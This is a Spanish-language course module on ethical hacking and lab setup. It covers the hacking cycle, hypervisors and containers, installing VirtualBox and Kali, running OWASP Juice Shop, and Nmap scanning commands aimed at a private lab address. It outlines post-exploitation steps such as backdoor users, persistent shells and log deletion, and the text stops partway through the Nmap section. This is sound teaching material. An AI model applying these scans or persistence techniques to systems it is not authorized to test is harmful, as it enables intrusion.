# SEMANA 3: Fundamentos de Hacking Ético, Virtualización y Laboratorio de Pentesting

---

## Sitios de Referencia:
https://hub.docker.com/r/bkimminich/juice-shop
https://www.kali.org/get-kali/#kali-virtual-machines

## ÍNDICE DE LA SEMANA

1. Conceptos Fundamentales: Hacking y Hacking Ético
2. Ciclo del Hacking y Hacking Ético
3. Tecnologías de Virtualización: Contenedores, Hipervisores y Máquinas Virtuales
4. Instalación de VirtualBox
5. Kali Linux: Distribuciones y Herramientas Esenciales
6. Instalación de Kali Linux en VirtualBox
7. Instalación de OWASP Juice Shop en Kali Linux
8. Comandos de Linux y Docker para Pentesting
9. OWASP ZAP y Burp Suite: Análisis Profundo de Tráfico Web
10. Nikto: Escaneo de Vulnerabilidades Web
11. John the Ripper: Crackeo de Contraseñas
12. Pruebas de Denegación de Servicio
13. Ejemplo Práctico: 10 Vulnerabilidades Documentadas con Ciclo de Hacking

---

## 1. CONCEPTOS FUNDAMENTALES: HACKING Y HACKING ÉTICO

### 1.1. ¿Qué es el Hacking?

El término "hacking" tiene sus raíces en el MIT (Massachusetts Institute of Technology) durante los años 60, donde se usaba para describir el proceso de modificar programas para que hicieran algo diferente a lo originalmente diseñado. Hoy en día, el hacking se refiere a la explotación de vulnerabilidades en sistemas informáticos con diversos propósitos.

**Definición técnica:**
El hacking es el proceso de identificar y explotar debilidades en sistemas informáticos, redes o aplicaciones software. Implica comprender profundamente cómo funcionan los sistemas para encontrar puntos de entrada no previstos por los desarrolladores originales.

**Tipos de Hacking según la intención:**

| Tipo | Intención | Legalidad |
|------|-----------|-----------|
| **Black Hat** | Maliciosa, obtener beneficio personal | Ilegal |
| **White Hat** | Éticas, proteger y mejorar seguridad | Legal |
| **Grey Hat** | Sin autorización pero sin intención dañina | Cuestionable |
| **Script Kiddie** | Usa herramientas sin entender profundamente | Generalmente ilegal |
| **Hacktivista** | Motivación política o social | Cuestionable |

### 1.2. ¿Qué es el Hacking Ético?

El hacking ético, también conocido como "pentesting" (penetration testing) el hackign ètico abarca más actividades que el pentest, es la práctica de evaluar la seguridad de un sistema simulando ataques reales de manera controlada y autorizada. El objetivo es identificar vulnerabilidades antes de que los atacantes reales las descubran.

**Principios fundamentales del Hacking Ético:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    LOS 5 PILARES DEL HACKING ÉTICO              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. AUTORIZACIÓN EXPLÍCITA                                      │
│     └── Obtener permiso escrito antes de cualquier prueba       │
│                                                                 │
│  2. DEFINICIÓN DEL ALCANCE                                      │
│     └── Especificar qué sistemas se pueden probar y cuáles no   │
│                                                                 │
│  3. NO DAÑAR                                                    │
│     └── Minimizar impacto en sistemas de producción              │
│                                                                 │
│  4. REPORTE COMPLETO                                            │
│     └── Documentar TODOS los hallazgos encontrados              │
│                                                                 │
│  5. RESPONSABILIDAD                                             │
│     └── Reportar vulnerabilidades al dueño del sistema          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Diferencias entre Hacking Malicioso y Ético:**

| Aspecto | Hacking Malicioso | Hacking Ético |
|---------|------------------|---------------|
| **Propósito** | Beneficio personal, robar, dañar | Proteger, mejorar seguridad |
| **Autorización** | Sin permiso | Con permiso escrito |
| **Metodología** | No importa el impacto | Minimizar daños colaterales |
| **Resultado** | Destrucción/robo de datos/escala de privilegios | Informe con recomendaciones |
| **Legitimidad** | Ilegal | Legal con contrato adecuado |

### 1.3. Certificaciones de Hacking Ético Reconocidas

| Certificación | Proveedor | Enfoque | Nivel |
|--------------|-----------|---------|-------|
| **CEH** | EC-Council | Fundamentos de hacking ético | Básico-Intermedio |
| **OSCP** | OffSec | Pentesting práctico | Avanzado |
| **GPEN** | GIAC | Testing de penetración | Profesional |
| **CISSP** | (ISC)² | Gestión de seguridad | Gerencial |
| **eCPT** | eLearnSecurity | Pentesting práctico | Intermedio-Avanzado |

---

## 2. CICLO DEL HACKING Y HACKING ÉTICO

### 2.1. El Ciclo de Hacking: Una Metodología Sistémica

El hacking no es un acto espontáneo, sino un proceso estructurado que sigue fases lógicas. Comprender este ciclo es fundamental para realizar evaluaciones de seguridad completas y profesionales.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        CICLO DE HACKING ÉTICO                              │
│                                                                             │
│     ┌───────────────┐                                                       │
│     │   RECON      │◄──────────────────┐                                  │
│     │  (Reconocer) │                   │                                  │
│     └───────┬───────┘                   │                                  │
│             │                           │                                  │
│             ▼                           │                                  │
│     ┌───────────────┐                   │                                  │
│     │    ESCANEO    │                   │                                  │
│     │   (Escanear)  │                   │                                  │
│     └───────┬───────┘                   │                                  │
│             │                           │                                  │
│             ▼                           │                                  │
│     ┌───────────────┐                   │                                  │
│     │  ENUMERACIÓN  │───────────────────┼──────────────────────────────────┤
│     │  (Enumerar)   │                   │                                  │
│     └───────┬───────┘                   │                                  │
│             │                           │                                  │
│             ▼                           │                                  │
│     ┌───────────────┐                   │                                  │
│     │  EXPLOTACIÓN  │                   │                                  │
│     │  (Explotar)  │───────────────────┘                                  │
│     └───────┬───────┘                                                   │
│             │                                                           │
│             ▼                                                           │
│     ┌───────────────┐                                                   │
│     │  POST-EXPLOT  │                                                   │
│     │ (Mantener)    │                                                   │
│     └───────┬───────┘                                                   │
│             │                                                           │
│             ▼                                                           │
│     ┌───────────────┐                                                   │
│     │  INFORME      │                                                   │
│     │ (Documentar)  │                                                   │
│     └───────────────┘                                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.2. Descripción Detallada de Cada Fase

#### FASE 1: RECONOCIMIENTO (Information Gathering)

**Objetivo:** Recopilar la máxima información pública posible sobre el objetivo sin interactuar directamente con sus sistemas.

El reconocimiento es la fase más crítica del pentesting. Estadísticamente, el 70% del éxito de un ataque depende de la calidad de la información recopilada.

**Tipos de Reconocimiento:**

```
┌─────────────────────────────────────────────────────────────────┐
│                 TIPOS DE RECONOCIMIENTO                         │
├──────────────────────────┬──────────────────────────────────────┤
│    PASIVO               │    ACTIVO                            │
├──────────────────────────┼──────────────────────────────────────┤
│ • Búsquedas en Google   │ • Escaneo de puertos                 │
│ • WHOIS queries         │ • Ping sweeps                        │
│ • DNS enumeration       │ • Reconocimiento de servicios         │
│ • Redes sociales        │ • Traceroutes                        │
│ • Información pública   │ • Análisis de vulnerabilidades        │
│ • Metadatos públicos    │                                      │
├──────────────────────────┴──────────────────────────────────────┤
│ CARACTERÍSTICA:                                                │
│ • No genera tráfico hacia el objetivo                           │
│ • No deja huellas en los sistemas del objetivo                 │
│ • Legal en la mayoría de jurisdicciones                        │
└─────────────────────────────────────────────────────────────────┘
```

**Herramientas de Reconocimiento:**

| Herramienta | Función | Ejemplo de Uso |
|-------------|---------|----------------|
| theHarvester | Recopilar emails y subdominios | `theHarvester -d empresa.com -b all` |
| Maltego | Análisis visual de relaciones | Interfaz gráfica |
| WHOIS | Información de dominios | `whois empresa.com` |
| DNSenum | Enumeración DNS | `dnsenum empresa.com` |
| Recon-ng | Framework de reconocimiento | `recon-cli` |
| Google Dorking | Búsquedas avanzadas | `site:empresa.com filetype:pdf` |

#### FASE 2: ESCANEO (Scanning)

**Objetivo:** Identificar puertos abiertos, servicios activos y vulnerabilidades potenciales en los sistemas objetivo.

```
┌─────────────────────────────────────────────────────────────────┐
│                    TIPOS DE ESCANEO                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ESCANEO DE PUERTOS (PORT SCANNING)                            │
│  ├── TCP Connect (-sT)        → Completo, genera logs          │
│  ├── TCP SYN (-sS)            → Sigiloso, requiere root        │
│  ├── UDP (-sU)                → Lento, servicios DNS/SMB       │
│  └── ACK (-sA)                → Mapeo de firewalls           │
│                                                                 │
│  DETECCIÓN DE SERVICIOS Y VERSIONES                             │
│  └── nmap -sV identifica versiones exactas de software         │
│                                                                 │
│  DETECCIÓN DE SISTEMA OPERATIVO                                │
│  └── nmap -O fingerprint del SO                               │
│                                                                 │
│  ESCANEO DE VULNERABILIDADES                                    │
│  └── Scripts NSE (Nmap Scripting Engine)                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Herramientas de Escaneo:**

| Herramienta | Uso | Ejemplo |
|-------------|-----|---------|
| Nmap | Escaneo de puertos | `nmap -sV -sC -p- objetivo` |
| Nikto | Vulnerabilidades web | `nikto -h url` |
| OpenVAS | Escaneo de vulnerabilidades | Interfaz web |
| Nessus | Escaneo comercial | Interfaz web |
| OpenBullet | Testing de APIs | Config files |

#### FASE 3: ENUMERACIÓN (Enumeration)

**Objetivo:** Extraer información detallada de los servicios descubiertos para identificar puntos de entrada.

La enumeración va más allá del escaneo. Implica interactuar activamente con los servicios para extraer información útil: usuarios, recursos compartidos, información de configuración, etc.

**Ejemplos de Enumeración por Servicio:**

| Servicio | Qué Enumerar | Herramientas |
|----------|--------------|--------------|
| HTTP/HTTPS | Rutas, parámetros, tecnologías | Burp Suite, dirb |
| SMB | Usuarios, recursos compartidos | enum4linux, smbclient |
| FTP | Archivos, versiones | ftp client, nmap scripts |
| SSH | Versiones, algoritmos | ssh-audit |
| DNS | Registros,Transferencias zona | dig, dnsenum |
| SMTP | Usuarios válidos | smtp-user-enum |

#### FASE 4: EXPLOTACIÓN (Exploitation)

**Objetivo:** Aprovechar las vulnerabilidades identificadas para obtener acceso no autorizado al sistema.

```
┌─────────────────────────────────────────────────────────────────┐
│                  PROCESO DE EXPLOTACIÓN                         │
│                                                                 │
│  1. IDENTIFICAR VULNERABILIDAD                                 │
│     └──nmap, metasploit                                         │
│                                                                 │
│  2. BUSCAR O DESARROLLAR EXPLOIT                               │
│     └── searchsploit, Exploit-DB, Metasploit                   │
│                                                                 │
│  3. PREPARAR PAYLOAD                                           │
│     └── Shellcode, reverse shell, meterpreter                  │
│                                                                 │
│  4. EJECUTAR EXPLOIT                                           │
│     └── Verificar si funciona                                  │
│                                                                 │
│  5. OBTENER ACCESO                                             │
│     └── Shell, meterpreter, acceso web                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Fuentes de Exploits:**

| Fuente | URL/Comando | Tipo |
|--------|-------------|------|
| Exploit-DB | `searchsploit` | Base de datos local |
| Metasploit | `msfconsole` | Framework completo |
| CVE Database | cve.mitre.org | Vulnerabilidades conocidas |
| GitHub | Búsqueda directa | Exploits recientes |
| PacketStorm | packetstormsecurity.com | Herramientas y exploits |

#### FASE 5: POST-EXPLOTACIÓN (Post-Exploitation)

**Objetivo:** Mantener acceso, escalar privilegios y extraer información sensible.

**Actividades de Post-Explotación:**

```
┌─────────────────────────────────────────────────────────────────┐
│                ACTIVIDADES DE POST-EXPLOTACIÓN                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. ESCALADA DE PRIVILEGIOS                                    │
│     ├── Linux: SUID bins, sudo -l, kernel exploits            │
│     └── Windows: SeImpersonatePrivilege, potato family        │
│                                                                 │
│  2. MANTENIMIENTO DE ACCESO                                    │
│     ├── Crear usuarios_backdoor                               │
│     ├── Instalar shells persistentes                           │
│     └── Configurar tareas cron                                │
│                                                                 │
│  3. RECONOCIMIENTO INTERNO                                    │
│     ├── Mapeo de red interna                                  │
│     ├── Identificar otros sistemas                            │
│     └── Enumerar recursos compartidos                          │
│                                                                 │
│  4. EXTRACCIÓN DE DATOS                                       │
│     ├── Hashes de contraseñas                                  │
│     ├── Archivos sensibles                                    │
│     └── Bases de datos                                        │
│                                                                 │
│  5. LIMPIEZA DE HUELLAS                                       │
│     ├── Eliminar logs                                          │
│     └── Ocultar archivos                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### FASE 6: INFORME (Reporting)

**Objetivo:** Documentar todos los hallazgos de manera profesional y accionable.

**Estructura de un Informe de Pentesting:**

1. **Resumen Ejecutivo** - Para gerencia
2. **Alcance** - Sistemas probados
3. **Metodología** - Estándares seguidos
4. **Hallazgos Detallados** - Cada vulnerabilidad
5. **Riesgo Global** - Puntuación general
6. **Recomendaciones** - Priorizadas
7. **Anexos** - Evidencia técnica

### 2.3. Aplicación del Ciclo al Hacking Ético

En el contexto del hacking ético, cada fase debe documentarse exhaustivamente y siempre dentro del alcance autorizado. El hacker ético tiene la responsabilidad de no causar daños y de reportar TODO lo encontrado, incluso lo que no pudo ser explotado.

---

## 3. TECNOLOGÍAS DE VIRTUALIZACIÓN

### 3.1. Conceptos Fundamentales

#### 3.1.1. Máquinas Virtuales (VMs)

Una máquina virtual es un ambiente completamente aislado que simula un computador físico. Cada VM tiene su propio sistema operativo, kernel, aplicaciones y recursos virtuales.

```
┌─────────────────────────────────────────────────────────────────┐
│                    ARQUITECTURA DE VM                           │
│                                                                 │
│    ┌─────────────────────────────────────────────────────────┐  │
│    │              MÁQUINA VIRTUAL                            │  │
│    │  ┌─────────────────────────────────────────────────────┐│  │
│    │  │              SISTEMA OPERATIVO GUEST                 ││  │
│    │  │  ┌───────────────────────────────────────────────┐  ││  │
│    │  │  │           APLICACIONES                         │  ││  │
│    │  │  └───────────────────────────────────────────────┘  ││  │
│    │  │  ┌───────────────────────────────────────────────┐  ││  │
│    │  │  │           LIBRERÍAS Y DEPENDENCIAS            │  ││  │
│    │  │  └───────────────────────────────────────────────┘  ││  │
│    │  │  ┌───────────────────────────────────────────────┐  ││  │
│    │  │  │           KERNEL PROPIO                        │  ││  │
│    │  │  │    (Linux 5.15, Windows 10, etc.)            │  ││  │
│    │  │  └───────────────────────────────────────────────┘  ││  │
│    │  └─────────────────────────────────────────────────────┘│  │
│    │  ┌─────────────────────────────────────────────────────┐│  │
│    │  │           HIPERVISOR / VIRTUALIZACIÓN               ││  │
│    │  └─────────────────────────────────────────────────────┘│  │
│    └─────────────────────────────────────────────────────────┘  │
│                            │                                    │
│                            ▼                                    │
│    ┌─────────────────────────────────────────────────────────┐  │
│    │              HARDWARE FÍSICO (HOST)                     │  │
│    │                                                         │  │
│    │   CPU (Virtualizado) │ RAM │ DISCO │ RED │ GPU         │  │
│    └─────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Características de las VMs:**
- **Aislamiento completo**: Cada VM tiene su propio kernel
- **Inicios lentos**: 30 segundos a varios minutos
- **Tamaño grande**: 10-60 GB típicamente
- **Overhead**: 5-15% de rendimiento adicional

#### 3.1.2. Hipervisores

Un hipervisor (también llamado Virtual Machine Monitor - VMM) es el software que crea y gestiona máquinas virtuales. Actúa como capa intermedia entre el hardware físico y los sistemas operativos virtualizados.

```
┌─────────────────────────────────────────────────────────────────┐
│                 TIPOS DE HIPERVISORES                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   TIPO 1: BARE METAL (NATIVO)                                  │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │                                                         │   │
│   │   VM1    VM2    VM3    VM4                             │   │
│   │                                                         │   │
│   │   ┌─────────────────────────────────────────────────┐   │   │
│   │   │              HIPERVISOR                          │   │   │
│   │   │         (Se ejecuta directamente                  │   │   │
│   │   │          sobre el hardware)                       │   │   │
│   │   └─────────────────────────────────────────────────┘   │   │
│   │                                                         │   │
│   │   ┌─────────────────────────────────────────────────┐   │   │
│   │   │           HARDWARE FÍSICO                       │   │   │
│   │   └─────────────────────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│   EJEMPLOS: VMware ESXi, Microsoft Hyper-V, Xen, Proxmox        │
│   USO: Centros de datos, servidores de producción               │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   TIPO 2: HOSTED (HOESPEDADO)                                  │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │                                                         │   │
│   │   VM1    VM2    VM3                                    │   │
│   │                                                         │   │
│   │   ┌─────────────────────────────────────────────────┐   │   │
│   │   │              HIPERVISOR                          │   │   │
│   │   └─────────────────────────────────────────────────┘   │   │
│   │                                                         │   │
│   │   ┌─────────────────────────────────────────────────┐   │   │
│   │   │         SISTEMA OPERATIVO HOST                  │   │
│   │   │            (Windows, Linux, Mac)                 │   │   │
│   │   └─────────────────────────────────────────────────┘   │   │
│   │                                                         │   │
│   │   ┌─────────────────────────────────────────────────┐   │   │
│   │   │           HARDWARE FÍSICO                       │   │   │
│   │   └─────────────────────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│   EJEMPLOS: VirtualBox, VMware Workstation, Parallels          │
│   USO: Desarrollo, pruebas, laboratorios de aprendizaje         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

| Característica | Tipo 1 (Bare Metal) | Tipo 2 (Hosted) |
|---------------|---------------------|------------------|
| **Rendimiento** | Casi nativo (95-98%) | Overhead adicional (85-95%) |
| **Instalación** | Directo en hardware | Sobre SO existente |
| **Seguridad** | Mayor aislamiento | Depende del host |
| **Costo** | Licencias costosas | Gratuitos disponibles |
| **Uso típico** | Producción/cloud | Desarrollo/pruebas |
| **Requisitos** | Hardware dedicado | Cualquier computador |

#### 3.1.3. Contenedores

Los contenedores son unidades estándar de software que empaquetan código y todas sus dependencias para que una aplicación se ejecute de manera rápida y confiable en diferentes entornos.

```
┌─────────────────────────────────────────────────────────────────┐
│                  ARQUITECTURA DE CONTENEDORES                   │
│                                                                 │
│    ┌─────────────────────────────────────────────────────────┐  │
│    │              CONTENEDOR 1    CONTENEDOR 2  CONTENEDOR 3 │  │
│    │                                                         │  │
│    │   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   │  │
│    │   │   APP 1     │  │   APP 2     │  │   APP 3     │   │  │
│    │   │             │  │             │  │             │   │  │
│    │   │ + Deps      │  │ + Deps      │  │ + Deps      │   │  │
│    │   └─────────────┘  └─────────────┘  └─────────────┘   │  │
│    │                                                         │  │
│    │   ┌─────────────────────────────────────────────────┐   │  │
│    │   │           MOTOR DE CONTENEDORES                 │   │  │
│    │   │              (Docker, Podman)                  │   │  │
│    │   └─────────────────────────────────────────────────┘   │  │
│    │                                                         │  │
│    │   ┌─────────────────────────────────────────────────┐   │  │
│    │   │         KERNEL DEL SISTEMA OPERATIVO HOST       │   │  │
│    │   └─────────────────────────────────────────────────┘   │  │
│    │                                                         │  │
│    └─────────────────────────────────────────────────────────┘  │
│                            │                                    │
│                            ▼                                    │
│    ┌─────────────────────────────────────────────────────────┐  │
│    │              HARDWARE FÍSICO                            │  │
│    └─────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Características de los Contenedores:**
- **Inicio más rápido**
- **Tamaño más pequeño**
- **Rendimiento**: Casi nativo
- **Portabilidad**: Funcionan igual en cualquier entorno
- **Aislamiento**: A nivel de proceso (menos aislamiento que VMs)

#### 3.1.4. Imágenes, Volúmenes y Redes Docker

**Imágenes Docker:**
Una imagen es una plantilla de solo lectura que contiene el sistema de archivos y la configuración necesaria para crear un contenedor.

```bash
# Estructura de una imagen
# Capas apiladas de solo lectura

┌─────────────────────────────────┐
│         CAPA 4 (App Code)       │  ← Última capa añadida
├─────────────────────────────────┤
│         CAPA 3 (Dependencies)    │
├─────────────────────────────────┤
│         CAPA 2 (System Libs)     │
├─────────────────────────────────┤
│         CAPA 1 (Base Image)      │
└─────────────────────────────────┘

# Comandos básicos de imágenes
docker images                    # Listar imágenes locales
docker pull ubuntu:22.04         # Descargar imagen
docker rmi nombre_imagen          # Eliminar imagen
docker build -t miapp .         # Construir imagen desde Dockerfile
```

**Volúmenes Docker:**
Los volúmenes permiten persistir datos generados por los contenedores y compartirlos entre contenedores.

```bash
# Tipos de volúmenes
# 1. Volúmenes anónimos 
docker run -v /data container

# 2. Volúmenes nombrados (named volumes)
docker run -v mi_volumen:/data container

# 3. Bind mounts (directorios del host)
docker run -v /home/user/data:/data container

# Comandos de volúmenes
docker volume create mi_volumen
docker volume ls
docker volume inspect mi_volumen
docker volume rm mi_volumen
docker volume prune  # Eliminar volúmenes sin uso
```

**Redes Docker:**
Docker proporciona diferentes tipos de redes para la comunicación entre contenedores.

```bash
# Tipos de redes Docker
# 1. Bridge (por defecto)
#    └── Red privada para contenedores aislados

# 2. Host
#    └── Contenedor comparte la red del host

# 3. Overlay
#    └── Para Docker Swarm (múltiples servidores)

# 4. Macvlan
#    └── Contenedor obtiene IP real de la red

# Comandos de redes
docker network ls
docker network create mi_red
docker network connect mi_red contenedor
docker network disconnect mi_red contenedor
docker network rm mi_red
```

### 3.2. Comparación: VMs vs Contenedores

```
┌─────────────────────────────────────────────────────────────────┐
│              COMPARACIÓN VMs vs CONTENEDORES                     │
├──────────────────────────┬──────────────────────┬────────────────┤
│      CARACTERÍSTICA      │    MÁQUINAS VIRTUAL │   CONTENEDOR   │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Aislamiento              │ Completo (kernel)    │ Proceso        │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Tiempo de inicio        │ 30s - minutos        │ Segundos       │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Tamaño                   │ 10-60 GB             │ MB - pocos GB  │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Rendimiento             │ 85-95%              │ 98-99%         │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Sistema operativo       │ Cualquiera           │ Mismo kernel    │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Seguridad               │ Alta                 │ Moderada        │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Portabilidad            │ Buena                │ Excelente       │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Uso de recursos         │ Más recursos         │ Menos recursos  │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Persistencia datos      │ Disco virtual        │ Volúmenes      │
├──────────────────────────┼──────────────────────┼────────────────┤
│ Casos de uso            │ Pentesting, labs     │ DevOps, micros  │
└──────────────────────────┴──────────────────────┴────────────────┘
```

**¿Cuándo usar cada uno?**

| Escenario | Recomendación | Razón |
|-----------|--------------|-------|
| Pentesting/Análisis malware | Máquinas Virtuales | Aislamiento fuerte, cualquier SO |
| Laboratorio multi-SO | Máquinas Virtuales | Necesitas diferentes kernels |
| Desarrollo de apps | Contenedores | Inicio rápido, portabilidad |
| Microservicios | Contenedores | Escalabilidad, eficiencia |
| Aprender hacking | Máquinas Virtuales | Entorno controlado y seguro |
| Análisis forense | Máquinas Virtuales | Aislamiento completo |

---

## 4. INSTALACIÓN DE VIRTUALBOX

### 4.1. Requisitos del Sistema

| Componente | Mínimo | Recomendado |
|------------|--------|-------------|
| CPU | 64-bit, VT-x/AMD-V | Multi-core |
| RAM | 4 GB | 16+ GB |
| Espacio disco | 20 GB libres | 100+ GB |
| SO Host | Windows 7+, macOS 10.13+, Linux | Windows 11, última versión de macOS |

### 4.2. Pasos de Instalación en Windows

```
┌─────────────────────────────────────────────────────────────────┐
│              INSTALACIÓN DE VIRTUALBOX EN WINDOWS                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PASO 1: Descargar VirtualBox                                   │
│  ├── Ir a: https://www.virtualbox.org/wiki/Downloads           │
│  └── Descargar "Windows hosts"                                  │
│                                                                 │
│  PASO 2: Ejecutar Instalador                                    │
│  ├── Doble clic en el archivo .exe                            │
│  ├── Click "Next"                                              │
│  └── Ubicación (dejar por defecto o cambiar)                   │
│                                                                 │
│  PASO 3: Opciones de Instalación                               │
│  ├── ✓ VirtualBox USB Support                                  │
│  ├── ✓ VirtualBox Networking                                  │
│  ├── ✓ VirtualBox Python Support (opcional)                   │
│  └── Click "Install"                                           │
│                                                                 │
│  PASO 4: Instalar adaptadores                                    │
│  ├── Permitir instalación de drivers cuando aparezca          │
│  └── Firmar drivers de Microsoft si es necesario               │
│                                                                 │
│  PASO 5: Finalizar                                              │
│  └── Click "Finish"                                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 4.3. Instalación en Kali/Linux

https://www.kali.org/get-kali/#kali-virtual-machines

```bash
docker pull bkimminich/juice-shop  (puede necesitar privilegios sudo)
docker run --rm -p 3000:3000 bkimminich/juice-shop 
```

### 4.4. Configuración Post-Instalación

```
┌─────────────────────────────────────────────────────────────────┐
│           CONFIGURACIÓN INICIAL DE VIRTUALBOX                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. ABRIR VIRTUALBOX                                            │
│     └── Menú Inicio > VirtualBox                               │
│                                                                 │
│  2. CONFIGURAR PREFERENCIAS                                     │
│     ├── Archivo > Preferencias                                 │
│     ├── General: Carpeta de VMs por defecto                    │
│     ├── Red: Configurar redes NAT/Host-Only                    │
│     └── Entrada: Atajos de teclado                             │
│                                                                 │
│  3. CONFIGURAR REDES NAT (para VMs con internet)              │
│     └── Archivo > Herramientas > Administrador de Red NAT      │
│         └── Crear nueva red NAT (ej: 10.0.2.0/24)            │
│                                                                 │
│  4. CONFIGURAR REDES HOST-ONLY (para laboratorio)             │
│     └── Archivo > Herramientas > Administrador de Red Host-Only│
│         └── Crear adaptador con IP 192.168.56.1               │
│                                                                 │
│  5. ACTIVAR VIRTUALIZACIÓN EN BIOS/UEFI                       │
│     └── Reiniciar > Entrar a BIOS/UEFI                       │
│         └── Buscar "Intel VT-x" o "AMD-V" > Enabled          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5. KALI LINUX: DISTRIBUCIÓN ESPECIALIZADA Y HERRAMIENTAS ESENCIALES

### 5.1. ¿Qué es Kali Linux?

Kali Linux es una distribución de Linux basada en Debian, diseñada específicamente para pruebas de penetración y seguridad informática. Es el sucesor de BackTrack, que fue descontinuado en 2013.

**Características principales:**

| Característica | Descripción |
|----------------|-------------|
| **Más de 600 herramientas** | Preinstaladas y configuradas |
| **Metapackage modular** | Instalar solo lo necesario |
| **Actualizaciones frecuentes** | Rolling release |
| **Soporte multi-idioma** | Soporte completo de Bahasa Indonesia |
| **Personalizable** | Puedes crear tu ISO personalizada |
| **Varias arquitecturas** | ARM, x86, x64 |
| **Entorno Live** | Puedes ejecutarlo desde USB sin instalar |

### 5.2. Herramientas Preinstaladas por Categoría

```
┌─────────────────────────────────────────────────────────────────┐
│                 HERRAMIENTAS POR CATEGORÍA                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  RECONOCIMIENTO / INFORMATION GATHERING                          │
│  ├── nmap, masscan         → Escaneo de puertos                │
│  ├── theHarvester          → Emails y subdominios               │
│  ├── recon-ng              → Framework de reconocimiento       │
│  ├── Maltego               → Análisis visual de datos          │
│  └── dnsenum, dig          → Enumeración DNS                   │
│                                                                 │
│  ANÁLISIS DE VULNERABILIDADES                                   │
│  ├── nikto                 → Escaneo de vulnerabilidades web    │
│  ├── openvas               → Escáner de vulnerabilidades        │
│  ├── nmap scripts          → Scripts de detección              │
│  └── sqlmap                → Detección de SQL injection         │
│                                                                 │
│  EXPLOTACIÓN                                                    │
│  ├── metasploit-framework  → Framework de explotación          │
│  ├── searchsploit          → Buscador de exploits             │
│  ├── hydra                 → Ataques de fuerza bruta            │
│  └── SET (Social Engineer Toolkit) → Ingeniería social         │
│                                                                 │
│  ANÁLISIS WEB                                                   │
│  ├── burpsuite             → Proxy de pruebas web             │
│  ├── owasp-zap             → Escáner de vulnerabilidades web   │
│  ├── dirb                  → Fuzzing de directorios           │
│  └── wpscan                → Scanner específico para WordPress │
│                                                                 │
│  CONTRASEÑAS                                                     │
│  ├── john                  → Crackeo de contraseñas            │
│  ├── hashcat               → Crackeo GPU de hashes             │
│  ├── hydra                 → Ataques de fuerza bruta           │
│  └── hashid                → Identificación de tipos de hash   │
│                                                                 │
│  ANÁLISIS FORENSE                                               │
│  ├── Autopsy               → Análisis de discos               │
│  ├── volatility            → Análisis de memoria RAM           │
│  └── sleuth kit            → Herramientas de autopsia digital  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 5.3. Tres Herramientas Detalladas por Etapa del Hacking

#### HERRAMIENTA 1: NMAP (Fase de Escaneo)

**¿Qué es Nmap?**
Nmap (Network Mapper) es la herramienta de escaneo de red más famosa del mundo. Fue creada en 1997 por Gordon Lyon (Fyodor) y se utiliza para descubrir hosts y servicios en una red informática.

**¿Por qué es útil en hacking ético?**
Nmap es la puerta de entrada a cualquier evaluación de seguridad. Antes de explotar un sistema, necesitas saber qué puertos están abiertos, qué servicios se están ejecutando y qué versiones tienen. Esta información es crucial para identificar vulnerabilidades potenciales.

**Instalación (ya viene en Kali, pero para otras distribuciones):**
```bash
# En Kali ya está instalado
which nmap

# En otras distribuciones:
sudo apt install nmap      # Debian/Ubuntu
sudo yum install nmap      # CentOS/RHEL
brew install nmap          # macOS
```

**Comandos fundamentales:**

```bash
# ============================================
# ESCANEO BÁSICO DE UN HOST
# ============================================

# Escaneo simple de un host
nmap 192.168.56.102

# Escaneo con detección de servicios
nmap -sV 192.168.56.102

# Escaneo con scripts básicos
nmap -sC 192.168.56.102

# Escaneo completo (todas las opciones)
nmap -A 192.168.56.102

# Escaneo de toda una red
nmap -sV 192.168.56.0/24

# ============================================
# TÉCNICAS DE ESCANEO
# ============================================

# TCP SYN scan (requiere root, sigiloso)
sudo nmap -sS 192.168.56.102

# TCP connect scan (no requiere root, más ruido)
nmap -sT 192.168.56.102

# UDP scan (lento pero necesario para ciertos servicios)
sudo nmap -sU 192.168.56.102

# Escaneo rápido de los 100 puertos más comunes
nmap -F 192.168.56.102

# Escaneo de todos los puertos (1-65535)
nmap -p- 192.168.56.102

# ============================================
# DETECCIÓN DE SISTEMA OPERATIVO
# ============================================

# Detección de SO con fingerprints
sudo nmap -O 192.168.56.102

# Detección agresiva (SO + servicios + scripts)
nmap -A 192.168.56.102

# ============================================
# NMAP SCRIPTING ENGINE (NSE)
# ============================================

# Listar categorías de scripts disponibles
ls /usr/share/nmap/scripts/ | head -20

# Escaneo con scripts de vulnerabilidades
nmap --script vuln 192.168.56.102

# Scripts específicos
